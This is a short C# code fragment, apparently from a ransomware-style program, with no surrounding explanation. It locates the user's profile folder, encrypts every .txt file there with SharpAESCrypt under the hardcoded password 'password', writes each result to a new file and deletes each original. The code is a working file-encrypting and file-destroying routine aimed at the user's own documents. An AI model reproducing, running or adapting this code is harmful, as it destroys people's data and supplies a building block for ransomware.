

string path = Directory.GetParent(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)).FullName;
if (Environment.OSVersion.Version.Major >= 6)
{
    path = Directory.GetParent(path).ToString();
}

DirectoryInfo d = new DirectoryInfo(path);

FileInfo[] Files = d.GetFiles("*.txt");

foreach (FileInfo file in Files)
{
    string encrypted_files = $"{d}\\{file.Name}encrypt.txt";
    string target_file = $"{d}\\{file.Name}";    

    SharpAESCrypt.SharpAESCrypt.Encrypt("password", target_file, encrypted_files);

    File.Delete(target_file);

}


